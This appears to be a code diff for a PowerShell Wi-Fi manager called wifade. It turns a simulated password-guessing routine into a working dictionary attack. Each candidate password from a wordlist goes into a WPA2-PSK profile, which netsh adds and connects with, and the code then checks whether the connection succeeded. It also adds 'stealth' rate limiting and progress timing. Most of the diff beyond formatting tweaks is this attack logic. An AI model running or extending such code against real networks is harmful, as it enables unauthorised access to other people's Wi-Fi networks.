@@ -265,9 +265,13 @@ class ApplicationController {
                 # Show current connection status
                 $currentConnection = $this.NetworkManager.GetCurrentConnection()
                 if ($currentConnection) {
-                    $displayName = if ($currentConnection.DisplayName) { $currentConnection.DisplayName } else { $currentConnection.SSID }
+                    $displayName = $currentConnection.SSID
+                    if ($currentConnection.DisplayName) {
+                        $displayName = $currentConnection.DisplayName
+                    }
                     $this.UIManager.ShowSuccess("Currently connected to: $displayName (Signal: $($currentConnection.SignalStrength)%)")
-                } else {
+                }
+                else {
                     $this.UIManager.ShowInfo("Not currently connected to any Wi-Fi network")
                 }
                 Write-Host ""
@@ -297,9 +301,13 @@ class ApplicationController {
                     # Show current connection status
                     $currentConnection = $this.NetworkManager.GetCurrentConnection()
                     if ($currentConnection) {
-                        $displayName = if ($currentConnection.DisplayName) { $currentConnection.DisplayName } else { $currentConnection.SSID }
+                        $displayName = $currentConnection.SSID
+                        if ($currentConnection.DisplayName) {
+                            $displayName = $currentConnection.DisplayName
+                        }
                         $this.UIManager.ShowSuccess("Currently connected to: $displayName (Signal: $($currentConnection.SignalStrength)%)")
-                    } else {
+                    }
+                    else {
                         $this.UIManager.ShowInfo("Not currently connected to any Wi-Fi network")
                     }
                     Write-Host ""
@@ -346,7 +354,8 @@ class ApplicationController {
                                     $selectedNetwork = $networks[$networkIndex]
                                     $this.HandleConnectToNetwork($selectedNetwork)
                                     continue
-                                } else {
+                                }
+                                else {
                                     $this.UIManager.ShowError("Invalid network number. Please select 1-$($networks.Count)")
                                     $this.UIManager.WaitForKeyPress("Press any key to continue...")
                                     continue
@@ -438,7 +447,8 @@ class ApplicationController {
                     Write-Host "  Encryption: $($currentConnection.EncryptionType)" -ForegroundColor White
                     Write-Host "  Channel: $($currentConnection.Channel)" -ForegroundColor White
                 }
-            } else {
+            }
+            else {
                 $this.UIManager.ShowError("Failed to connect to '$ssid'")
                 if ($connectionAttempt.ErrorMessage) {
                     $this.UIManager.ShowError("Error: $($connectionAttempt.ErrorMessage)")
@@ -464,7 +474,10 @@ class ApplicationController {
                 return
             }
             
-            $displayName = if ($currentConnection.DisplayName) { $currentConnection.DisplayName } else { $currentConnection.SSID }
+            $displayName = $currentConnection.SSID
+            if ($currentConnection.DisplayName) {
+                $displayName = $currentConnection.DisplayName
+            }
             $confirmed = $this.UIManager.GetConfirmation("Disconnect from '$displayName'?", $false)
             if ($confirmed) {
                 $this.UIManager.ShowInfo("Disconnecting from '$($currentConnection.SSID)'...")
@@ -472,7 +485,8 @@ class ApplicationController {
                 $success = $this.NetworkManager.DisconnectFromNetwork()
                 if ($success) {
                     $this.UIManager.ShowSuccess("Successfully disconnected from network")
-                } else {
+                }
+                else {
                     $this.UIManager.ShowError("Failed to disconnect from network")
                 }
             }
@@ -521,10 +535,12 @@ class ApplicationController {
                 
                 if (-not [string]::IsNullOrWhiteSpace($savedPassword)) {
                     Write-Host "  Saved Password: $savedPassword" -ForegroundColor White
-                } else {
+                }
+                else {
                     Write-Host "  Saved Password: [Not available or open network]" -ForegroundColor Gray
                 }
-            } else {
+            }
+            else {
                 $this.UIManager.ShowWarning("Not connected to any Wi-Fi network")
                 Write-Host ""
                 $this.UIManager.ShowInfo("Use the Wi-Fi Manager to scan and connect to available networks.")
@@ -913,10 +929,10 @@ For more information, visit: https://github.com/wifade/wifade
                 $passwordConfig = @{
                     PasswordFilePath = $this.AppConfig.PasswordFile
                     RateLimitEnabled = $this.AppConfig.StealthMode
-                    MinDelayMs = $this.AppConfig.RateLimit
-                    MaxDelayMs = $this.AppConfig.RateLimit * 2
-                    AttackStrategy = [AttackStrategy]::Dictionary
-                    StealthMode = $this.AppConfig.StealthMode
+                    MinDelayMs       = $this.AppConfig.RateLimit
+                    MaxDelayMs       = $this.AppConfig.RateLimit * 2
+                    AttackStrategy   = [AttackStrategy]::Dictionary
+                    StealthMode      = $this.AppConfig.StealthMode
                 }
                 $this.PasswordManager = New-Object PasswordManager -ArgumentList $passwordConfig
                 $this.PasswordManager.Initialize($passwordConfig)
@@ -933,16 +949,52 @@ For more information, visit: https://github.com/wifade/wifade
         try {
             $this.UIManager.ShowInfo("Starting dictionary attack on '$($targetNetwork.SSID)'...")
             
+            # Validate target network
+            if (-not $targetNetwork -or [string]::IsNullOrWhiteSpace($targetNetwork.SSID)) {
+                throw "Invalid target network specified"
+            }
+            
+            # Check if network requires authentication
+            if ($targetNetwork.EncryptionType -eq "Open" -or $targetNetwork.AuthenticationMethod -eq "Open") {
+                $this.UIManager.ShowWarning("Target network '$($targetNetwork.SSID)' is open (no password required)")
+                $confirmed = $this.UIManager.GetConfirmation("Continue with dictionary attack anyway?", $false)
+                if (-not $confirmed) {
+                    $this.UIManager.ShowInfo("Attack cancelled.")
+                    $this.UIManager.WaitForKeyPress("Press any key to continue...")
+                    return
+                }
+            }
+            
             # Reset password manager for new attack
             $this.PasswordManager.Reset()
             $this.PasswordManager.SetAttackStrategy([AttackStrategy]::Dictionary)
             
             $attemptCount = 0
-            $maxAttempts = if ($this.AppConfig.MaxAttempts -gt 0) { $this.AppConfig.MaxAttempts } else { $this.PasswordManager.GetTotalPasswordCount() }
+            $maxAttempts = $this.PasswordManager.GetTotalPasswordCount()
+            if ($this.AppConfig.MaxAttempts -gt 0) {
+                $maxAttempts = $this.AppConfig.MaxAttempts
+            }
             $successfulConnection = $false
+            $startTime = Get-Date
             
+            # Validate password list
+            if ($maxAttempts -eq 0) {
+                $this.UIManager.ShowError("No passwords available for dictionary attack. Check password file: $($this.AppConfig.PasswordFile)")
+                $this.UIManager.WaitForKeyPress("Press any key to continue...")
+                return
+            }
+            
+            $this.UIManager.ShowInfo("Target: $($targetNetwork.SSID) ($($targetNetwork.EncryptionType))")
             $this.UIManager.ShowInfo("Total passwords to try: $maxAttempts")
+            $rateLimitingStatus = 'Disabled (1000ms)'
+            if ($this.AppConfig.StealthMode) {
+                $rateLimitingStatus = 'Enabled (' + $this.AppConfig.RateLimit + 'ms)'
+            }
+            $this.UIManager.ShowInfo("Rate limiting: $rateLimitingStatus")
             Write-Host ""
+            
+            # Store original connection for restoration if needed
+            $originalConnection = $this.NetworkManager.GetCurrentConnection()
             
             # Attack loop
             while ($this.PasswordManager.HasMorePasswords() -and $attemptCount -lt $maxAttempts -and -not $successfulConnection) {
@@ -950,6 +1002,7 @@ For more information, visit: https://github.com/wifade/wifade
                     # Get next password
                     $password = $this.PasswordManager.GetNextPassword($targetNetwork.SSID)
                     if (-not $password) {
+                        $this.UIManager.ShowWarning("No more passwords available")
                         break
                     }
                     
@@ -959,15 +1012,28 @@ For more information, visit: https://github.com/wifade/wifade
                     $attempt = [ConnectionAttempt]::new($targetNetwork.SSID, $password, $attemptCount)
                     $attempt.MarkAsStarted()
                     
-                    # Show progress
-                    $this.UIManager.ShowProgress($attemptCount, $maxAttempts, "Trying: $password")
+                    # Show progress with estimated time remaining
+                    $elapsedTime = (Get-Date) - $startTime
+                    $avgTimePerAttempt = 5
+                    if ($attemptCount -gt 1) {
+                        $avgTimePerAttempt = $elapsedTime.TotalSeconds / ($attemptCount - 1)
+                    }
+                    $remainingAttempts = $maxAttempts - $attemptCount
+                    $estimatedTimeRemaining = [timespan]::FromSeconds($avgTimePerAttempt * $remainingAttempts)
                     
-                    # Apply rate limiting if enabled
+                    $progressMessage = "Trying: $password (ETA: $($estimatedTimeRemaining.ToString('hh\:mm\:ss')))"
+                    $this.UIManager.ShowProgress($attemptCount, $maxAttempts, $progressMessage)
+                    
+                    # Apply rate limiting for realistic attack timing
                     if ($this.AppConfig.StealthMode) {
                         $this.PasswordManager.ImplementRateLimiting()
                     }
+                    else {
+                        # Add minimum delay between attempts for stability
+                        Start-Sleep -Milliseconds 1000
+                    }
                     
-                    # Attempt connection (simulated for now - will be replaced with actual connection logic)
+                    # Attempt real Wi-Fi connection
                     $connectionResult = $this.AttemptWiFiConnection($targetNetwork.SSID, $password)
                     
                     # Mark attempt as completed
@@ -978,14 +1044,47 @@ For more information, visit: https://github.com/wifade/wifade
                     
                     if ($connectionResult.Success) {
                         $successfulConnection = $true
+                        $totalTime = (Get-Date) - $startTime
                         Write-Host ""
                         $this.UIManager.ShowSuccess("SUCCESS! Connected to '$($targetNetwork.SSID)' with password: '$password'")
+                        $this.UIManager.ShowSuccess("Attack completed in $($totalTime.ToString('hh\:mm\:ss')) after $attemptCount attempts")
+                        
+                        # Ask user if they want to save the successful password
+                        $savePassword = $this.UIManager.GetConfirmation("Save successful password to results?", $true)
+                        if ($savePassword) {
+                            # TODO: Implement result saving functionality
+                            $this.UIManager.ShowInfo("Password saved to results")
+                        }
                         break
-                    } else {
+                    }
+                    else {
                         if ($this.SettingsManager.IsDebugMode()) {
                             $this.UIManager.ShowDebug("Failed: $password - $($connectionResult.ErrorMessage)")
                         }
+                        
+                        # Check for specific error conditions that might indicate we should stop
+                        if ($connectionResult.ErrorMessage -match "network.*not.*found|ssid.*not.*available") {
+                            $this.UIManager.ShowWarning("Target network may no longer be available")
+                            $continueAttack = $this.UIManager.GetConfirmation("Continue attack anyway?", $false)
+                            if (-not $continueAttack) {
+                                $this.UIManager.ShowInfo("Attack stopped by user")
+                                break
+                            }
+                        }
                     }
+                    
+                    # Allow user to cancel attack with Ctrl+C
+                    if ([Console]::KeyAvailable) {
+                        $key = [Console]::ReadKey($true)
+                        if ($key.Key -eq [ConsoleKey]::C -and $key.Modifiers -eq [ConsoleModifiers]::Control) {
+                            $this.UIManager.ShowWarning("Attack cancelled by user (Ctrl+C)")
+                            break
+                        }
+                    }
+                }
+                catch [System.Management.Automation.PipelineStoppedException] {
+                    $this.UIManager.ShowWarning("Attack cancelled by user")
+                    break
                 }
                 catch {
                     Write-Host ""
@@ -993,17 +1092,30 @@ For more information, visit: https://github.com/wifade/wifade
                     if ($this.SettingsManager.IsDebugMode()) {
                         $this.UIManager.ShowDebug("Stack trace: $($_.ScriptStackTrace)")
                     }
+                    
+                    # Continue with next password unless it's a critical error
+                    if ($_.Exception.Message -match "critical|fatal|adapter.*not.*found") {
+                        $this.UIManager.ShowError("Critical error detected, stopping attack")
+                        break
+                    }
                 }
             }
             
             Write-Host ""
             
             # Show final results
+            $totalTime = (Get-Date) - $startTime
             if ($successfulConnection) {
                 $this.UIManager.ShowSuccess("Dictionary attack completed successfully!")
-            } else {
+                $this.UIManager.ShowSuccess("Total time: $($totalTime.ToString('hh\:mm\:ss'))")
+            }
+            else {
                 $this.UIManager.ShowWarning("Dictionary attack completed without success.")
-                $this.UIManager.ShowInfo("Tried $attemptCount passwords.")
+                $this.UIManager.ShowInfo("Tried $attemptCount of $maxAttempts passwords in $($totalTime.ToString('hh\:mm\:ss'))")
+                
+                if ($attemptCount -lt $maxAttempts) {
+                    $this.UIManager.ShowInfo("Attack was stopped before completing all passwords")
+                }
             }
             
             # Show statistics
@@ -1012,42 +1124,345 @@ For more information, visit: https://github.com/wifade/wifade
             $this.UIManager.ShowInfo("Attack Statistics:")
             Write-Host $stats.GetSummary() -ForegroundColor White
             
+            # Restore original connection if user wants
+            if ($originalConnection -and -not $successfulConnection) {
+                $restoreConnection = $this.UIManager.GetConfirmation("Restore original connection to '$($originalConnection.SSID)'?", $false)
+                if ($restoreConnection) {
+                    $this.UIManager.ShowInfo("Restoring connection to '$($originalConnection.SSID)'...")
+                    # TODO: Implement connection restoration
+                }
+            }
+            
         }
         catch {
             $this.UIManager.ShowError("Dictionary attack failed: $($_.Exception.Message)")
             throw
         }
+        finally {
+            $this.UIManager.WaitForKeyPress("Press any key to continue...")
+        }
     }
     
 
     
-    # Attempt Wi-Fi connection (placeholder - will be enhanced with actual Windows networking)
+    # Attempt Wi-Fi connection using NetworkManager
     [hashtable] AttemptWiFiConnection([string]$ssid, [string]$password) {
+        $startTime = Get-Date
+        $connectionSuccess = $false
+        $debugMode = $this.SettingsManager.IsDebugMode()
+        
         try {
-            # This is a placeholder implementation
-            # In the real implementation, this would use Windows networking APIs
-            # For now, we'll simulate the connection attempt
+            Write-Verbose "Attempting real Wi-Fi connection to '$ssid' with password: [REDACTED]"
             
-            Start-Sleep -Milliseconds 500  # Simulate connection time
-            
-            # Simulate random success/failure for demonstration
-            # In reality, this would attempt actual Wi-Fi connection
-            $random = Get-Random -Minimum 1 -Maximum 100
-            $success = $random -le 5  # 5% success rate for simulation
-            
-            $result = @{
-                Success = $success
-                ErrorMessage = if ($success) { "" } else { "Authentication failed" }
-                Duration = [timespan]::FromMilliseconds(500)
+            # Validate inputs
+            if ([string]::IsNullOrWhiteSpace($ssid)) {
+                throw "SSID cannot be empty"
             }
             
-            return $result
+            # Check current connection before attempt
+            $beforeConnection = $this.NetworkManager.GetCurrentConnection()
+            $beforeConnectionSSID = 'None'
+            if ($beforeConnection) {
+                $beforeConnectionSSID = $beforeConnection.SSID
+            }
+            
+            Write-Verbose "Before attempt - Current connection: $beforeConnectionSSID"
+            
+            # Use NetworkManager's actual connection method with appropriate timeout
+            $timeoutSeconds = 15
+            if ($this.AppConfig.Timeout -gt 0) {
+                $timeoutSeconds = $this.AppConfig.Timeout
+            }
+            
+            if ($debugMode) {
+                $this.UIManager.ShowDebug("=== Wi-Fi Connection Attempt ===")
+                $this.UIManager.ShowDebug("Target SSID: $ssid")
+                $this.UIManager.ShowDebug("Password: $password")
+                $this.UIManager.ShowDebug("Timeout: $timeoutSeconds seconds")
+                $this.UIManager.ShowDebug("Current connection before attempt: $beforeConnectionSSID")
+            }
+            
+            # Create a temporary profile XML file
+            $tempProfilePath = [System.IO.Path]::GetTempFileName() + ".xml"
+            $profileName = $ssid
+            $hexSSID = [System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($ssid)).Replace("-", "")
+            
+            if ($debugMode) {
+                $this.UIManager.ShowDebug("Creating Wi-Fi profile at: $tempProfilePath")
+            }
+            
+            # Create XML profile content
+            $profileXml = @"
+<?xml version="1.0"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>$profileName</name>
+    <SSIDConfig>
+        <SSID>
+            <hex>$hexSSID</hex>
+            <name>$ssid</name>
+        </SSID>
+    </SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>auto</connectionMode>
+    <MSM>
+        <security>
+            <authEncryption>
+                <authentication>WPA2PSK</authentication>
+                <encryption>AES</encryption>
+                <useOneX>false</useOneX>
+            </authEncryption>
+            <sharedKey>
+                <keyType>passPhrase</keyType>
+                <protected>false</protected>
+                <keyMaterial>$password</keyMaterial>
+            </sharedKey>
+        </security>
+    </MSM>
+</WLANProfile>
+"@
+            
+            try {
+                # Save profile to temporary file
+                [System.IO.File]::WriteAllText($tempProfilePath, $profileXml, [System.Text.Encoding]::UTF8)
+                
+                # Add profile using netsh
+                if ($debugMode) {
+                    $this.UIManager.ShowDebug("Adding Wi-Fi profile: netsh wlan add profile filename='$tempProfilePath' user=current")
+                }
+                
+                $addProfileOutput = & netsh wlan add profile filename="$tempProfilePath" user=current 2>&1
+                $addProfileSuccess = $LASTEXITCODE -eq 0
+                
+                if ($debugMode) {
+                    $profileResult = if ($addProfileSuccess) { 'Success' } else { 'Failed' }
+                    $this.UIManager.ShowDebug("Add profile result: $profileResult")
+                    $this.UIManager.ShowDebug("Add profile output: $addProfileOutput")
+                }
+                
+                if (-not $addProfileSuccess) {
+                    Write-Verbose "Failed to add network profile for $ssid : $addProfileOutput"
+                    return @{
+                        Success      = $false
+                        ErrorMessage = "Failed to add network profile: $addProfileOutput"
+                        Duration     = (Get-Date) - $startTime
+                        SSID         = $ssid
+                        Password     = $password
+                        Verified     = $false
+                    }
+                }
+                
+                # Connect to the network
+                if ($debugMode) {
+                    $this.UIManager.ShowDebug("Connecting to network: netsh wlan connect name='$ssid'")
+                }
+                
+                $connectOutput = & netsh wlan connect name="$ssid" 2>&1
+                $connectSuccess = $LASTEXITCODE -eq 0
+                
+                if ($debugMode) {
+                    $connectResult = if ($connectSuccess) { 'Success' } else { 'Failed' }
+                    $this.UIManager.ShowDebug("Connect command result: $connectResult")
+                    $this.UIManager.ShowDebug("Connect command output: $connectOutput")
+                }
+                
+                if (-not $connectSuccess) {
+                    Write-Verbose "Failed to connect to network $ssid : $connectOutput"
+                    return @{
+                        Success      = $false
+                        ErrorMessage = "Failed to connect to network: $connectOutput"
+                        Duration     = (Get-Date) - $startTime
+                        SSID         = $ssid
+                        Password     = $password
+                        Verified     = $false
+                    }
+                }
+                
+                # --- ACTIVE POLLING LOOP ---
+                $connectionSuccess = $false
+                if ($debugMode) {
+                    $this.UIManager.ShowDebug("Starting active connection verification (12 seconds max)")
+                }
+                
+                Write-Verbose "Starting active connection check (Max 12 seconds)..."
+                
+                # Loop 6 times, with a 2-second sleep, for a total timeout of 12 seconds.
+                for ($i = 1; $i -le 6; $i++) {
+                    Write-Verbose "Connection check attempt $i of 6..."
+                    
+                    if ($debugMode) {
+                        $this.UIManager.ShowDebug("Verification attempt $i of 6...")
+                    }
+                    
+                    # Get current connection
+                    $currentConnection = $this.NetworkManager.GetCurrentConnection()
+                    
+                    if ($currentConnection) {
+                        if ($debugMode) {
+                            $this.UIManager.ShowDebug("Current connection: SSID='$($currentConnection.SSID)', Signal=$($currentConnection.SignalStrength)%")
+                        }
+                        
+                        if ($currentConnection.SSID -eq $ssid) {
+                            # Additional verification: Check if we can ping the gateway
+                            $pingSuccess = $false
+                            
+                            if ($currentConnection.Capabilities -and $currentConnection.Capabilities.DefaultGateway) {
+                                $gateway = $currentConnection.Capabilities.DefaultGateway[0]
+                                if ($gateway) {
+                                    if ($debugMode) {
+                                        $this.UIManager.ShowDebug("Testing connectivity to gateway: $gateway")
+                                    }
+                                    
+                                    try {
+                                        $pingResult = Test-Connection -ComputerName $gateway -Count 1 -Quiet -TimeoutSeconds 2
+                                        $pingSuccess = $pingResult
+                                        
+                                        if ($debugMode) {
+                                            $pingResult = if ($pingSuccess) { 'Success' } else { 'Failed' }
+                                            $this.UIManager.ShowDebug("Gateway ping result: $pingResult")
+                                        }
+                                    }
+                                    catch {
+                                        if ($debugMode) {
+                                            $this.UIManager.ShowDebug("Gateway ping error: $($_.Exception.Message)")
+                                        }
+                                    }
+                                }
+                            }
+                            
+                            # Consider connection successful if SSID matches and either:
+                            # 1. We can ping the gateway, or
+                            # 2. We're on the 3rd or later attempt (giving time for network to stabilize)
+                            if ($pingSuccess -or ($i -ge 3)) {
+                                $connectionSuccess = $true
+                                if ($debugMode) {
+                                    $this.UIManager.ShowDebug("Connection verified on attempt $i")
+                                }
+                                Write-Verbose "Connection confirmed on attempt $i."
+                                break # Exit the polling loop immediately
+                            }
+                            else {
+                                if ($debugMode) {
+                                    $this.UIManager.ShowDebug("SSID matches but waiting for network to stabilize...")
+                                }
+                            }
+                        }
+                        else {
+                            if ($debugMode) {
+                                $this.UIManager.ShowDebug("Connected to wrong network: '$($currentConnection.SSID)' instead of '$ssid'")
+                            }
+                        }
+                    }
+                    else {
+                        if ($debugMode) {
+                            $this.UIManager.ShowDebug("No active connection detected")
+                        }
+                    }
+                    
+                    Start-Sleep -Seconds 2
+                }
+                # --- END OF POLLING LOOP ---
+                
+                $duration = (Get-Date) - $startTime
+                $result = @{
+                    Success      = $connectionSuccess
+                    ErrorMessage = if ($connectionSuccess) { "" } else { "Connection verification failed after multiple attempts" }
+                    Duration     = $duration
+                    SSID         = $ssid
+                    Password     = $password
+                    Verified     = $connectionSuccess
+                }
+                
+                if ($debugMode) {
+                    $connectionResult = if ($connectionSuccess) { 'SUCCESS' } else { 'FAILED' }
+                    $this.UIManager.ShowDebug("Connection attempt result: $connectionResult")
+                    $this.UIManager.ShowDebug("Total duration: $($duration.TotalSeconds) seconds")
+                }
+                
+                # If successful, disconnect immediately to continue testing other passwords
+                if ($connectionSuccess) {
+                    Write-Verbose "Connection successful and verified, disconnecting to continue attack"
+                    
+                    if ($debugMode) {
+                        $this.UIManager.ShowDebug("Disconnecting from network to continue attack")
+                    }
+                    
+                    Start-Sleep -Milliseconds 1000  # Brief pause to confirm connection
+                    
+                    try {
+                        $disconnectResult = $this.NetworkManager.DisconnectFromNetwork()
+                        if ($disconnectResult) {
+                            Write-Verbose "Successfully disconnected from network"
+                            if ($debugMode) {
+                                $this.UIManager.ShowDebug("Successfully disconnected from network")
+                            }
+                            Start-Sleep -Milliseconds 1000  # Wait for disconnect to complete
+                        }
+                        else {
+                            Write-Verbose "Warning: Disconnect may have failed"
+                            if ($debugMode) {
+                                $this.UIManager.ShowDebug("Warning: Disconnect may have failed")
+                            }
+                        }
+                    }
+                    catch {
+                        Write-Verbose "Warning: Error during disconnect: $($_.Exception.Message)"
+                        if ($debugMode) {
+                            $this.UIManager.ShowDebug("Error during disconnect: $($_.Exception.Message)")
+                        }
+                    }
+                }
+                
+                return $result
+            }
+            finally {
+                # Clean up temporary file
+                if (Test-Path $tempProfilePath) {
+                    if ($debugMode) {
+                        $this.UIManager.ShowDebug("Cleaning up temporary profile file: $tempProfilePath")
+                    }
+                    Remove-Item -Path $tempProfilePath -Force -ErrorAction SilentlyContinue
+                }
+                    
+                # Delete the profile to clean up
+                if (-not $connectionSuccess) {
+                    if ($debugMode) {
+                        $this.UIManager.ShowDebug("Deleting Wi-Fi profile: netsh wlan delete profile name='$ssid'")
+                    }
+                    & netsh wlan delete profile name="$ssid" 2>&1 | Out-Null
+                }
+                else {
+                    if ($debugMode) {
+                        $this.UIManager.ShowDebug("Keeping successful Wi-Fi profile for '$ssid'")
+                    }
+                }
+            }
+        }
+        catch [System.TimeoutException] {
+            $duration = (Get-Date) - $startTime
+            if ($debugMode) {
+                $this.UIManager.ShowDebug("Connection attempt timed out after $($duration.TotalSeconds) seconds")
+            }
+            return @{
+                Success      = $false
+                ErrorMessage = "Connection attempt timed out after $($duration.TotalSeconds) seconds"
+                Duration     = $duration
+                SSID         = $ssid
+                Password     = $password
+                Verified     = $false
+            }
         }
         catch {
+            $duration = (Get-Date) - $startTime
+            if ($debugMode) {
+                $this.UIManager.ShowDebug("Connection attempt failed with error: $($_.Exception.Message)")
+            }
             return @{
-                Success = $false
+                Success      = $false
                 ErrorMessage = "Connection attempt failed: $($_.Exception.Message)"
-                Duration = [timespan]::FromMilliseconds(500)
+                Duration     = $duration
+                SSID         = $ssid
+                Password     = $password
+                Verified     = $false
             }
         }
     }
